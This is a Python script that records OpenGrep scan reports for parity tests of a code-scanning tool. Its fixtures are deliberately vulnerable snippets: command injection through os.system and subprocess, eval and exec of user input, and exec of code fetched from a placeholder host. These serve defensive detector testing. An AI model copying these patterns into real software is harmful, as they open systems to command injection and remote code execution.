"""Record OpenGrep's raw report and the oracle bridge's findings for the offline parity tests.

    PYTHONPATH=<oracle>/src python record_contract.py

Runs the pinned OpenGrep once per package through the oracle's opengrep_bridge.check (same
selection, argv and environment as production) and writes <name>.recorded.json beside this
script: the package files, the languages, the temporary-target map, the JSON report with the
temporary root replaced by "<temporary>" and the rule file by "<rules>", and check()'s findings.
bridge_test.go rebuilds each package, replays the report through FindingsFromReport and
compares, so the contract rows are checked without OpenGrep on the test machine.
"""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
from pathlib import Path

from skill_xray import ingest, parse
from skill_xray.opengrep_bridge import check, select_executable_code
from skill_xray.opengrep_runtime import resolve_opengrep

HERE = Path(__file__).parent


def _rows(name):
    return [json.loads(line) for line in (HERE / name).read_text(encoding="utf-8").splitlines()]


def python_contract():
    # tests/test_opengrep_parity.py::test_live_opengrep_matches_frozen_python_contract
    cases = _rows("opengrep_python_contract.jsonl")
    return {"%03d_%s.py" % (i, c["name"].removeprefix("test_")): c["code"]
            for i, c in enumerate(cases)}


def shell_contract():
    # tests/test_opengrep_shell_parity.py::test_live_opengrep_matches_shell_contract_exactly
    cases = _rows("opengrep_shell_contract.jsonl")
    return {"%03d_%s%s" % (i, c["name"], ".sh" if c["ext"] else ""): c["source"]
            for i, c in enumerate(cases)}


# tests/test_opengrep_parity.py::test_live_opengrep_keeps_three_nonliteral_positive_contracts
FENCE = {
    "SKILL.md": (
        "---\nname: t\nallowed-tools:\n  Bash: true\n---\n"
        "```python\nimport os, sys\nos.system(sys.argv[1])\n```\n"
        "```python\nfrom __future__ import annotations\nx = 1\n```\n"
    ),
    "many.py": "import os\n" + "os.system(input())\n" * 100,
    "real.py": "import os, sys\nos.system(sys.argv[1])\n",
    "bomb.py": "import os\nos.system(" + "+".join(['"a"'] * 3000) + ")\n",
}

# tests/test_opengrep_bridge.py::test_real_opengrep_phase1_matrix_when_available
PHASE1 = {
    "input_system.py": "import os\nvalue = input()\nos.system(value)\n",
    "helper.py": "import os\ndef launch(value):\n    os.system(value)\nlaunch(input())\n",
    "method_assigned.py": (
        "import os\nclass Runner:\n    def launch(self, value):\n"
        "        os.system(value)\nrunner = Runner()\nrunner.launch(input())\n"
    ),
    "method_inline.py": (
        "import os\nclass Runner:\n    def launch(self, value):\n"
        "        os.system(value)\nRunner().launch(input())\n"
    ),
    "method_internal.py": (
        "import os\nclass Runner:\n    def source(self):\n        return input()\n"
        "    def launch(self):\n        os.system(self.source())\n"
        "runner = Runner()\nrunner.launch()\n"
    ),
    "subprocess_alias.py": "import subprocess as sp\nimport sys\nsp.run(sys.argv[1], shell=True)\n",
    "argparse_source.py": (
        "import argparse, os\nparser = argparse.ArgumentParser()\n"
        "args = parser.parse_args()\nos.system(args.command)\n"
    ),
    "environment.py": "import os\nos.system(os.getenv('COMMAND'))\n",
    "dict_bad.py": (
        "import os\ncommands = {'bad': input(), 'good': 'echo ok'}\n"
        "os.system(commands['bad'])\n"
    ),
    "eval_input.py": "value = input()\neval(value)\n",
    "remote_requests.py": "import requests\npayload = requests.get('https://example.test').text\nexec(payload)\n",
    "remote_alias.py": "import requests as rq\npayload = rq.get('https://example.test').text\nexec(payload)\n",
    "remote_urlopen.py": (
        "from urllib.request import urlopen\npayload = urlopen('https://example.test').read()\nexec(payload)\n"
    ),
    "nested_remote_literal.py": (
        "import os, requests\n"
        "requests.post('https://example.test', json={'stamp': os.popen('date').read()})\n"
    ),
    "literal.py": "import os\nos.system('echo safe')\n",
    "shell_false.py": "import subprocess\nsubprocess.run(input(), shell=False)\n",
    "quoted.py": "import os, shlex\nos.system(shlex.quote(input()))\n",
    "overwrite.py": "import os\nvalue = input()\nvalue = 'echo safe'\nos.system(value)\n",
    "dict_safe.py": (
        "import os\ncommands = {'bad': input(), 'good': 'echo ok'}\n"
        "os.system(commands['good'])\n"
    ),
    "shadowed_exec.py": "exec = print\nexec(input())\n",
    "shadowed_eval.py": "def eval(value):\n    print(value)\neval(input())\n",
    "shadowed_input.py": "import os\ndef input(): return 'safe'\nos.system(input())\n",
    "shadowed_sys.py": (
        "import os\nclass Fake: argv = ['safe']\nsys = Fake()\n"
        "os.system(sys.argv[0])\n"
    ),
    "shadowed_requests.py": (
        "class Response: text = 'safe'\nclass Client:\n"
        "    def get(self, *_args): return Response()\n"
        "requests = Client()\nexec(requests.get('x').text)\n"
    ),
}


def _scrub(value, replacements):
    if isinstance(value, list):
        return [_scrub(item, replacements) for item in value]
    if isinstance(value, dict):
        return {key: _scrub(item, replacements) for key, item in value.items()}
    if isinstance(value, str):
        for old, new in replacements:
            value = value.replace(old, new)
    return value


def record(name, files, languages, executable):
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp) / "pkg"
        root.mkdir()
        for rel, text in files.items():
            (root / rel).parent.mkdir(parents=True, exist_ok=True)
            (root / rel).write_bytes(text.encode("utf-8"))
        parsed = parse.parse_package(ingest.build_package(str(root)))
        captured = {}

        def runner(command, **kwargs):
            completed = subprocess.run(command, **kwargs)
            captured["report"] = Path(command[command.index("--output") + 1]).read_text(
                encoding="utf-8")
            captured["root"] = kwargs["cwd"]
            captured["rules"] = command[command.index("--config") + 1]
            return completed

        findings = check(parsed, executable=executable, runner=runner, languages=languages,
                         timeout=300)
        selected = select_executable_code(parsed, languages=languages)
    root = captured["root"]
    report = _scrub(json.loads(captured["report"]), [
        (root, "<temporary>"), (root.replace("\\", "/"), "<temporary>"),
        (captured["rules"], "<rules>"),
    ])
    record = {
        "files": files,
        "languages": list(languages),
        "targets": {"%04d%s" % (i, s.suffix): {"rel": s.rel, "origin": s.origin, "suffix": s.suffix}
                    for i, s in enumerate(selected)},
        "report": report,
        "findings": [f.to_dict() for f in findings],
    }
    out = HERE / ("%s.recorded.json" % name)
    out.write_text(json.dumps(record, sort_keys=True, ensure_ascii=True), encoding="utf-8")
    print("%s: %d targets, %d results, %d findings, %d bytes" % (
        name, len(record["targets"]), len(report.get("results", [])), len(findings),
        out.stat().st_size))


def main():
    executable = resolve_opengrep(None)
    if not executable:
        sys.exit("pinned OpenGrep is not installed")
    record("python_contract", python_contract(), ("python",), executable)
    record("shell_contract", shell_contract(), ("shell",), executable)
    record("fence_contract", FENCE, ("python",), executable)
    record("phase1_matrix", PHASE1, ("python",), executable)


if __name__ == "__main__":
    main()
